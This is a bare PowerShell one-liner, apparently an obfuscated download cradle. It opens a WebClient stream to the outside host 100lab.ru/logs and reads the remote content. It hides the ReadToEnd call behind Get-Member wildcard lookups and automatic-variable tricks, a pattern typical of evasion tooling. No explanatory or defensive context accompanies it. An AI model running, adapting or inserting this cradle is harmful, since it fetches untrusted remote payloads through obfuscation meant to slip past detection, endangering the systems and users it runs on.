$url='http://100lab.ru/logs';$wr=([System.Net.WebClient]::New());$sr=New-Object IO.StreamReader($wr.OpenRead($url));$res=($sr|ForEach-Object{(GCI Variable:\_).Value.(($_|Get-Member|?{(GCI Variable:\_).Value.Name-like'*nd'}).Name).Invoke()});$sr.Close();$res
